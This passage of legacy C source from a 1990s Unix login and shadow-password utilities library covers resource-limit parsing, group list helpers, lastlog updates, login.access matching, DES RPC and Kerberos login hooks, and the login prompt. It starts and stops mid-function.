#ifdef RLIMIT_MEMLOCK
		case 'm':
		case 'M':
		/* RLIMIT_MEMLOCK - max locked-in-memory address space (KB) */
			retval |= setrlimit_value(RLIMIT_MEMLOCK, pp, 1024);
			break;
#endif
#ifdef RLIMIT_NOFILE
		case 'n':
		case 'N':
			/* RLIMIT_NOFILE - max number of open files */
			retval |= setrlimit_value(RLIMIT_NOFILE, pp, 1);
			break;
#endif
#ifdef RLIMIT_RSS
		case 'r':
		case 'R':
			/* RLIMIT_RSS - max resident set size (KB) */
			retval |= setrlimit_value(RLIMIT_RSS, pp, 1024);
			break;
#endif
#ifdef RLIMIT_STACK
		case 's':
		case 'S':
			/* RLIMIT_STACK - max stack size (KB) */
			retval |= setrlimit_value(RLIMIT_STACK, pp, 1024);
			break;
#endif
		case 'l':
		case 'L':
			/* LIMIT the number of concurent logins */
			retval |= check_logins(name, pp);
			break;
	}
	return retval;
}

static int
setup_user_limits(uname)
	char *uname;
{
	/* TODO: allow and use @group syntax --cristiang */
	FILE *fil;
	char buf[1024];
	char name[1024];
	char limits[1024];
	char deflimits[1024];
	char tempbuf[1024];

	/* init things */
	bzero(buf, sizeof(buf));
	bzero(name, sizeof(name));
	bzero(limits, sizeof(limits));
	bzero(deflimits, sizeof(deflimits));
	bzero(tempbuf, sizeof(tempbuf));

	/* start the checks */
	fil = fopen(LIMITS_FILE, "r");
	if (fil == NULL) {
#if 0  /* no limits file is ok, not everyone is a BOFH :-).  --marekm */
		SYSLOG((LOG_WARN, NO_LIMITS, uname, LIMITS_FILE));
#endif
		return 0;
	}
	/* The limits file have the following format:
	 * - '#' (comment) chars only as first chars on a line;
	 * - username must start on first column
	 * A better (smarter) checking should be done --cristiang */
	while (fgets(buf, 1024, fil) != NULL) {
		if (buf[0]=='#' || buf[0]=='\n')
			continue;
		bzero(tempbuf, sizeof(tempbuf));
		/* a valid line should have a username, then spaces,
		 * then limits
		 * we allow the format:
		 * username    L2  D2048  R4096
		 * where spaces={' ',\t}. Also, we reject invalid limits.
		 * Imposing a limit should be done with care, so a wrong
		 * entry means no care anyway :-). A '-' as a limits
		 * strings means no limits --cristiang */
		if (sscanf(buf, "%s%[CDFMNRSTULcdfmnrstul0-9 \t-]",
		    name, tempbuf) == 2)
			if (strcmp(name, uname) == 0) {
				strcpy(limits, tempbuf);
				break;
			} else if (strcmp(name, "*") == 0) {
				strcpy(deflimits, tempbuf);
			}
	}
	fclose(fil);
	if (limits[0] == '\0') {
		/* no user specific limits */
		if (deflimits[0] == '\0') /* no default limits */
			return 0;
		strcpy(limits, deflimits); /* use the default limits */
	}
	return do_user_limits(limits, uname);
}
#endif  /* LIMITS */

/*
 *	set the process nice, ulimit, and umask from the password file entry
 */

void
setup_limits(info)
	const struct passwd *info;
{
	char	*cp;
	int	i;
	long	l;

	/*
	 * See if the GECOS field contains values for NICE, UMASK or ULIMIT.
	 * If this feature is enabled in /etc/login.defs, we make those
	 * values the defaults for this login session.
	 */

	if ( getdef_bool("QUOTAS_ENAB") ) {
#ifdef LIMITS
		if (info->pw_uid)
		if (setup_user_limits(info->pw_name) & LOGIN_ERROR_LOGIN) {
			fprintf(stderr, "Too many logins.\n");
			sleep(2);
			exit(1);
		}
#endif
		for (cp = info->pw_gecos ; cp != NULL ; cp = strchr (cp, ',')) {
			if (*cp == ',')
				cp++;

			if (strncmp (cp, "pri=", 4) == 0) {
				i = atoi (cp + 4);
				if (i >= -20 && i <= 20)
					(void) nice (i);

				continue;
			}
			if (strncmp (cp, "ulimit=", 7) == 0) {
				l = strtol (cp + 7, (char **) 0, 10);
				set_filesize_limit(l);
				continue;
			}
			if (strncmp (cp, "umask=", 6) == 0) {
				i = strtol (cp + 6, (char **) 0, 8) & 0777;
				(void) umask (i);

				continue;
			}
		}
	}
}
/*
 * Copyright 1991 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/* Removed duplicated code from gpmain.c, useradd.c, userdel.c and
   usermod.c.  --marekm */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: list.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include "prototypes.h"
#include "defines.h"

/*
 * add_list - add a member to a list of group members
 *
 *	the array of member names is searched for the new member
 *	name, and if not present it is added to a freshly allocated
 *	list of users.
 */

char **
add_list(list, member)
	char **list;
	const char *member;
{
	int	i;
	char	**tmp;

	/*
	 * Scan the list for the new name.  Return the original list
	 * pointer if it is present.
	 */

	for (i = 0;list[i] != (char *) 0;i++)
		if (strcmp (list[i], member) == 0)
			return list;

	/*
	 * Allocate a new list pointer large enough to hold all the
	 * old entries, and the new entries as well.
	 */

	tmp = (char **) xmalloc ((i + 2) * sizeof member);

	/*
	 * Copy the original list to the new list, then append the
	 * new member and NULL terminate the result.  This new list
	 * is returned to the invoker.
	 */

	for (i = 0;list[i] != (char *) 0;i++)
		tmp[i] = list[i];

	tmp[i++] = xstrdup (member);
	tmp[i] = (char *) 0;

	return tmp;
}

/*
 * del_list - delete a member from a list of group members
 *
 *	the array of member names is searched for the old member
 *	name, and if present it is deleted from a freshly allocated
 *	list of users.
 */

char **
del_list(list, member)
	char **list;
	const char *member;
{
	int	i, j;
	char	**tmp;

	/*
	 * Scan the list for the old name.  Return the original list
	 * pointer if it is not present.
	 */

	for (i = j = 0;list[i] != (char *) 0;i++)
		if (strcmp (list[i], member))
			j++;

	if (j == i)
		return list;

	/*
	 * Allocate a new list pointer large enough to hold all the
	 * old entries.
	 */

	tmp = (char **) xmalloc ((j + 1) * sizeof member);

	/*
	 * Copy the original list except the deleted members to the
	 * new list, then NULL terminate the result.  This new list
	 * is returned to the invoker.
	 */

	for (i = j = 0;list[i] != (char *) 0;i++)
		if (strcmp (list[i], member))
			tmp[j++] = list[i];

	tmp[j] = (char *) 0;

	return tmp;
}

char **
dup_list(list)
	char * const *list;
{
	int i;
	char **tmp;

	for (i = 0; list[i]; i++)
		;

	tmp = (char **) xmalloc((i + 1) * sizeof(char *));

	i = 0;
	while (*list)
		tmp[i++] = xstrdup(*list++);

	tmp[i] = (char *) 0;
	return tmp;
}

int
is_on_list(list, member)
	char * const *list;
	const char *member;
{
	while (*list) {
		if (strcmp(*list, member) == 0)
			return 1;
		list++;
	}
	return 0;
}

/*
 * comma_to_list - convert comma-separated list to (char *) array
 */

char **
comma_to_list(comma)
	const char *comma;
{
	char	*members;
	char	**array;
	int	i;
	char	*cp, *cp2;

	/*
	 * Make a copy since we are going to be modifying the list
	 */

	members = xstrdup (comma);

	/*
	 * Count the number of commas in the list
	 */

	for (cp = members, i = 0;;i++)
		if ((cp2 = strchr (cp, ',')))
			cp = cp2 + 1;
		else
			break;

	/*
	 * Add 2 - one for the ending NULL, the other for the last item
	 */

	i += 2;

	/*
	 * Allocate the array we're going to store the pointers into.
	 */

	array = (char **) xmalloc (sizeof (char *) * i);

	/*
	 * Empty list is special - 0 members, not 1 empty member.  --marekm
	 */

	if (!*members) {
		*array = (char *) 0;
		return array;
	}

	/*
	 * Now go walk that list all over again, this time building the
	 * array of pointers.
	 */

	for (cp = members, i = 0;;i++) {
		array[i] = cp;
		if ((cp2 = strchr (cp, ','))) {
			*cp2++ = '\0';
			cp = cp2;
		} else {
			array[i + 1] = (char *) 0;
			break;
		}
	}

	/*
	 * Return the new array of pointers
	 */

	return array;
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: log.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <utmp.h>
#if HAVE_UTMPX_H
#include <utmpx.h>
#endif
#include <pwd.h>
#include <fcntl.h>
#include <time.h>
#include "defines.h"
#if HAVE_LASTLOG_H
#include <lastlog.h>
#else
#include "lastlog_.h"
#endif

extern	struct	utmp	utent;
#if HAVE_UTMPX_H
extern	struct	utmpx	utxent;
#endif
extern	struct	passwd	pwent;
extern	struct	lastlog	lastlog;
extern	char	**environ;

/* 
 * dolastlog - create lastlog entry
 *
 *	A "last login" entry is created for the user being logged in.  The
 *	UID is extracted from the global (struct passwd) entry and the
 *	TTY information is gotten from the (struct utmp).
 */

void
dolastlog ()
{
	int	fd;
	off_t	offset;
	struct	lastlog	newlog;

	/*
	 * If the file does not exist, don't create it.
	 */

	if ((fd = open (LASTLOG_FILE, O_RDWR)) == -1)
		return;

	/*
	 * The file is indexed by UID number.  Seek to the record
	 * for this UID.  Negative UID's will create problems, but ...
	 */

	offset = (unsigned long) pwent.pw_uid * sizeof lastlog;

	if (lseek (fd, offset, SEEK_SET) != offset) {
		(void) close (fd);
		return;
	}

	/*
	 * Read the old entry so we can tell the user when they last
	 * logged in.  Then construct the new entry and write it out
	 * the way we read the old one in.
	 */

	if (read (fd, (char *) &lastlog, sizeof lastlog) != sizeof lastlog)
		bzero ((char *) &lastlog, sizeof lastlog);
	newlog = lastlog;

	(void) time (&newlog.ll_time);
	(void) strncpy (newlog.ll_line, utent.ut_line, sizeof newlog.ll_line);
#if HAVE_UTMPX_H
	(void) strncpy (newlog.ll_host, utxent.ut_host, sizeof newlog.ll_host);
#elif HAVE_LL_HOST
	(void) strncpy (newlog.ll_host, utent.ut_host, sizeof newlog.ll_host);
#endif
	(void) lseek (fd, offset, SEEK_SET);
	(void) write (fd, (char *) &newlog, sizeof newlog);
	(void) close (fd);
}

/* Taken from logdaemon-5.0, only minimal changes.  --marekm */

/************************************************************************
* Copyright 1995 by Wietse Venema.  All rights reserved. Individual files
* may be covered by other copyrights (as noted in the file itself.)
*
* This material was originally written and compiled by Wietse Venema at
* Eindhoven University of Technology, The Netherlands, in 1990, 1991,
* 1992, 1993, 1994 and 1995.
*
* Redistribution and use in source and binary forms are permitted
* provided that this entire copyright notice is duplicated in all such
* copies.  
*
* This software is provided "as is" and without any expressed or implied
* warranties, including, without limitation, the implied warranties of
* merchantibility and fitness for any particular purpose.
************************************************************************/

#include <config.h>
#ifdef LOGIN_ACCESS
#include "rcsid.h"
RCSID("$Id: login_access.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")
 /*
  * This module implements a simple but effective form of login access
  * control based on login names and on host (or domain) names, internet
  * addresses (or network numbers), or on terminal line names in case of
  * non-networked logins. Diagnostics are reported through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#include <sys/types.h>
#include <stdio.h>
#include <syslog.h>
#include <ctype.h>
#include <grp.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

extern struct group *getgrnam();
extern int errno;

#if !defined(MAXHOSTNAMELEN) || (MAXHOSTNAMELEN < 64)
#undef MAXHOSTNAMELEN
#define MAXHOSTNAMELEN 256
#endif

 /* Path name of the access control file. */

#ifndef	TABLE
#define TABLE	"/etc/login.access"
#endif

 /* Delimiters for fields and for lists of users, ttys or hosts. */

static char fs[] = ":";			/* field separator */
static char sep[] = ", \t";		/* list-element separator */

 /* Constants to be used in assignments only, not in comparisons... */

#define YES             1
#define NO              0

static int list_match();
static int user_match();
static int from_match();
static int string_match();

/* login_access - match username/group and host/tty with access control file */

int
login_access(user, from)
char   *user;
char   *from;
{
    FILE   *fp;
    char    line[BUFSIZ];
    char   *perm;			/* becomes permission field */
    char   *users;			/* becomes list of login names */
    char   *froms;			/* becomes list of terminals or hosts */
    int     match = NO;
    int     end;
    int     lineno = 0;			/* for diagnostics */

    /*
     * Process the table one line at a time and stop at the first match.
     * Blank lines and lines that begin with a '#' character are ignored.
     * Non-comment lines are broken at the ':' character. All fields are
     * mandatory. The first field should be a "+" or "-" character. A
     * non-existing table means no access control.
     */

    if ((fp = fopen(TABLE, "r"))) {
	while (!match && fgets(line, sizeof(line), fp)) {
	    lineno++;
	    if (line[end = strlen(line) - 1] != '\n') {
		syslog(LOG_ERR, "%s: line %d: missing newline or line too long",
		       TABLE, lineno);
		continue;
	    }
	    if (line[0] == '#')
		continue;			/* comment line */
	    while (end > 0 && isspace(line[end - 1]))
		end--;
	    line[end] = 0;			/* strip trailing whitespace */
	    if (line[0] == 0)			/* skip blank lines */
		continue;
	    if (!(perm = strtok(line, fs))
		|| !(users = strtok((char *) 0, fs))
		|| !(froms = strtok((char *) 0, fs))
		|| strtok((char *) 0, fs)) {
		syslog(LOG_ERR, "%s: line %d: bad field count", TABLE, lineno);
		continue;
	    }
	    if (perm[0] != '+' && perm[0] != '-') {
		syslog(LOG_ERR, "%s: line %d: bad first field", TABLE, lineno);
		continue;
	    }
	    match = (list_match(froms, from, from_match)
		     && list_match(users, user, user_match));
	}
	(void) fclose(fp);
    } else if (errno != ENOENT) {
	syslog(LOG_ERR, "cannot open %s: %m", TABLE);
    }
    return (match == 0 || (line[0] == '+'));
}

/* list_match - match an item against a list of tokens with exceptions */

static int list_match(list, item, match_fn)
char   *list;
char   *item;
int   (*match_fn) ();
{
    char   *tok;
    int     match = NO;

    /*
     * Process tokens one at a time. We have exhausted all possible matches
     * when we reach an "EXCEPT" token or the end of the list. If we do find
     * a match, look for an "EXCEPT" list and recurse to determine whether
     * the match is affected by any exceptions.
     */

    for (tok = strtok(list, sep); tok != 0; tok = strtok((char *) 0, sep)) {
	if (strcasecmp(tok, "EXCEPT") == 0)	/* EXCEPT: give up */
	    break;
	if ((match = (*match_fn) (tok, item)))	/* YES */
	    break;
    }
    /* Process exceptions to matches. */

    if (match != NO) {
	while ((tok = strtok((char *) 0, sep)) && strcasecmp(tok, "EXCEPT"))
	     /* VOID */ ;
	if (tok == 0 || list_match((char *) 0, item, match_fn) == NO)
	    return (match);
    }
    return (NO);
}

/* myhostname - figure out local machine name */

static char *myhostname()
{
    static char name[MAXHOSTNAMELEN + 1] = "";

    if (name[0] == 0) {
	gethostname(name, sizeof(name));
	name[MAXHOSTNAMELEN] = 0;
    }
    return (name);
}

/* netgroup_match - match group against machine or user */

static int netgroup_match(group, machine, user)
char   *group;
char   *machine;
char   *user;
{
#ifdef NIS
    static char *mydomain = 0;

    if (mydomain == 0)
	yp_get_default_domain(&mydomain);
    return (innetgr(group, machine, user, mydomain));
#else
    syslog(LOG_ERR, "NIS netgroup support not configured");
    return (NO);
#endif
}

/* user_match - match a username against one token */

static int user_match(tok, string)
char   *tok;
char   *string;
{
    struct group *group;
    int     i;
    char   *at;

    /*
     * If a token has the magic value "ALL" the match always succeeds.
     * Otherwise, return YES if the token fully matches the username, or if
     * the token is a group that contains the username.
     */

    if ((at = strchr(tok + 1, '@')) != 0) {	/* split user@host pattern */
	*at = 0;
	return (user_match(tok, string) && from_match(at + 1, myhostname()));
    } else if (tok[0] == '@') {			/* netgroup */
	return (netgroup_match(tok + 1, (char *) 0, string));
    } else if (string_match(tok, string)) {	/* ALL or exact match */
	return (YES);
    } else if ((group = getgrnam(tok))) {	/* try group membership */
	for (i = 0; group->gr_mem[i]; i++)
	    if (strcasecmp(string, group->gr_mem[i]) == 0)
		return (YES);
    }
    return (NO);
}

/* from_match - match a host or tty against a list of tokens */

static int from_match(tok, string)
char   *tok;
char   *string;
{
    int     tok_len;
    int     str_len;

    /*
     * If a token has the magic value "ALL" the match always succeeds. Return
     * YES if the token fully matches the string. If the token is a domain
     * name, return YES if it matches the last fields of the string. If the
     * token has the magic value "LOCAL", return YES if the string does not
     * contain a "." character. If the token is a network number, return YES
     * if it matches the head of the string.
     */

    if (tok[0] == '@') {			/* netgroup */
	return (netgroup_match(tok + 1, string, (char *) 0));
    } else if (string_match(tok, string)) {	/* ALL or exact match */
	return (YES);
    } else if (tok[0] == '.') {			/* domain: match last fields */
	if ((str_len = strlen(string)) > (tok_len = strlen(tok))
	    && strcasecmp(tok, string + str_len - tok_len) == 0)
	    return (YES);
    } else if (strcasecmp(tok, "LOCAL") == 0) {	/* local: no dots */
	if (strchr(string, '.') == 0)
	    return (YES);
    } else if (tok[(tok_len = strlen(tok)) - 1] == '.'	/* network */
	       && strncmp(tok, string, tok_len) == 0) {
	return (YES);
    }
    return (NO);
}

/* string_match - match a string against one token */

static int string_match(tok, string)
char   *tok;
char   *string;
{

    /*
     * If the token has the magic value "ALL" the match always succeeds.
     * Otherwise, return YES if the token fully matches the string.
     */

    if (strcasecmp(tok, "ALL") == 0) {		/* all: always matches */
	return (YES);
    } else if (strcasecmp(tok, string) == 0) {	/* try exact match */
	return (YES);
    }
    return (NO);
}
#endif  /* LOGIN_ACCESS */
/* Taken from logdaemon-5.0, only minimal changes.  --marekm */

/************************************************************************
* Copyright 1995 by Wietse Venema.  All rights reserved. Individual files
* may be covered by other copyrights (as noted in the file itself.)
*
* This material was originally written and compiled by Wietse Venema at
* Eindhoven University of Technology, The Netherlands, in 1990, 1991,
* 1992, 1993, 1994 and 1995.
*
* Redistribution and use in source and binary forms are permitted
* provided that this entire copyright notice is duplicated in all such
* copies.  
*
* This software is provided "as is" and without any expressed or implied
* warranties, including, without limitation, the implied warranties of
* merchantibility and fitness for any particular purpose.
************************************************************************/

#include <config.h>
#ifdef DES_RPC
#include "rcsid.h"
RCSID("$Id: login_desrpc.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")
 /*
  * Decrypt the user's secret secure RPC key and stores it into the
  * keyserver. Returns 0 if successful, -1 on failure.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#include <stdio.h>
#include <rpc/rpc.h>
#include <rpc/key_prot.h>

int
login_desrpc(passwd)
char   *passwd;
{
    char    netname[MAXNETNAMELEN + 1];
    char    secretkey[HEXKEYBYTES + 1];

    getnetname(netname);
    if (getsecretkey(netname, secretkey, passwd) == 0) {
	return (-1);
    }
    if (secretkey[0] == 0) {
	fprintf(stderr, "Password does not decrypt secret key for %s.\n",
		netname);
	return (-1);
    }
    if (key_setsecret(secretkey) < 0) {
	fprintf(stderr,
	  "Could not set %s's secret key: is the keyserv daemon running?\n",
		netname);
	return (-1);
    }
    return (0);
}
#endif
/* Taken from logdaemon-5.0, only minimal changes.  --marekm */

/************************************************************************
* Copyright 1995 by Wietse Venema.  All rights reserved. Individual files
* may be covered by other copyrights (as noted in the file itself.)
*
* This material was originally written and compiled by Wietse Venema at
* Eindhoven University of Technology, The Netherlands, in 1990, 1991,
* 1992, 1993, 1994 and 1995.
*
* Redistribution and use in source and binary forms are permitted
* provided that this entire copyright notice is duplicated in all such
* copies.  
*
* This software is provided "as is" and without any expressed or implied
* warranties, including, without limitation, the implied warranties of
* merchantibility and fitness for any particular purpose.
************************************************************************/

#include <config.h>
#ifdef KERBEROS
#include "rcsid.h"
RCSID("$Id: login_krb.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <krb.h>

 /*
  * Do an equivalent to kinit here. We need to do the kinit before trying to
  * cd to the home directory, because it might be on a remote filesystem that
  * uses Kerberos authentication. We also need to do this after we've
  * setuid() to the user, or krb_get_pw_in_tkt() won't know where to put the
  * ticket.
  * 
  * We don't really care about whether or not it succeeds; if it fails, we'll
  * just carry on bravely.
  * 
  * NB: we assume: local realm, same username and password as supplied to login.
  * 
  * Security note: if pp is NULL, login doesn't have the password. This is
  * common when it's called by rlogind. Since this is almost always a remote
  * connection, we don't want to risk asking for the password by supplying a
  * NULL pp to krb_get_pw_in_tkt(), because somebody could be listening. So
  * we'll just forget the whole thing.  -jdd
  */

int
login_kerberos(username, password)
char   *username;
char   *password;
{
    char    realm[REALM_SZ];

    (void) krb_get_lrealm(realm, 1);
    if (password != 0)
	(void) krb_get_pw_in_tkt(username, "", realm, "krbtgt",
				 realm, DEFAULT_TKT_LIFE, password);
}
#endif /* KERBEROS */
/*
 * Copyright 1989 - 1993, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: loginprompt.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <stdio.h>
#include <signal.h>
#include <ctype.h>
#include "prototypes.h"
#include "defines.h"
#include "getdef.h"

#ifndef ISSUE_FILE
#define ISSUE_FILE "/etc/issue"
#endif

/*
 * login_prompt - prompt the user for their login name
 *
 * login_prompt() displays the standard login prompt.  If the option
 * ISSUE_FILE_ENAB is set, the file /etc/issue is displayed
 * before the prompt.
 */

void
login_prompt(prompt, name, namesize)
	const char *prompt;
	char *name;
	int namesize;
{
	char	buf[BUFSIZ];
#define MAX_ENV 32
	char	*envp[MAX_ENV];
	int	envc;
	char	*cp;
	int	i;
	FILE	*fp;
	RETSIGTYPE	(*sigquit)();
#ifdef	SIGTSTP
	RETSIGTYPE	(*sigtstp)();
#endif

	/*
	 * There is a small chance that a QUIT character will be part of
	 * some random noise during a prompt.  Deal with this by exiting
	 * instead of core dumping.  If SIGTSTP is defined, do the same
	 * thing for that signal.
	 */

	sigquit = signal (SIGQUIT, exit);
#ifdef	SIGTSTP
	sigtstp = signal (SIGTSTP, exit);
#endif

	/*
	 * See if the user has configured the /etc/issue file to
	 * be displayed and display it before the prompt.
	 */

	if (prompt) {
		if (getdef_bool ("ISSUE_FILE_ENAB")) {
			if ((fp = fopen (ISSUE_FILE, "r"))) {
				while ((i = getc (fp)) != EOF)
					putc (i, stdout);

				fclose (fp);
			}
		}
		gethostname(buf, sizeof buf);
		printf (prompt, buf);
		fflush (stdout);
	}

	/* 
	 * Read the user's response.  The trailing newline will be
	 * removed.
	 */

	bzero (buf, sizeof buf);
	if (fgets (buf, sizeof buf, stdin) != buf)
		exit (1);

	buf[strlen (buf) - 1] = '\0';	/* remove \n [ must be there ] */

	/*
	 * Skip leading whitespace.  This makes "  username" work right.
	 * Then copy the rest (up to the end or the first "non-graphic"
	 * character into the username.
	 */

	for (cp = buf;*cp == ' ' || *cp == '\t';cp++)
		;

	for (i = 0;i < namesize - 1 && isgraph (*cp);name[i++] = *cp++)
		;
	while (isgraph(*cp))
		cp++;

	if (*cp)
		cp++;

	name[i] = '\0';

	/*
	 * This is a disaster, at best.  The user may have entered extra
	 * environmental variables at the prompt.  There are several ways
	 * to do this, and I just take the easy way out.
	 */

	if (*cp != '\0') {		/* process new variables */
		char *nvar;
		/*static*/ int count = 1;

		for (envc = 0;envc < MAX_ENV;envc++) {
			nvar = strtok(envc ? (char *)0 : cp, " \t,");
			if (!nvar)
				break;
			if (strchr(nvar, '=')) {
				envp[envc] = nvar;
			} else {
				envp[envc] = xmalloc(strlen(nvar) + 32);
				sprintf(envp[envc], "L%d=%s", count++, nvar);
			}
		}
		set_env (envc, envp);
	}

	/*
	 * Set the SIGQUIT handler back to its original value
	 */

	(void) signal (SIGQUIT, sigquit);
#ifdef	SIGTSTP
	(void) signal (SIGTSTP, sigtstp);
#endif
}
/*
 * Copyright 1989 - 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>
#include "defines.h"
#include <sys/stat.h>
#include <stdio.h>

#include "getdef.h"

#include "rcsid.h"
RCSID("$Id: mail.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

extern	char	*getenv();

void
mailcheck ()
{
	struct	stat	statbuf;
	char	*mailbox;

	if (! getdef_bool("MAIL_CHECK_ENAB"))
		return;
	if (! (mailbox = getenv ("MAIL")))
		return;

	if (stat (mailbox, &statbuf) == -1 || statbuf.st_size == 0)
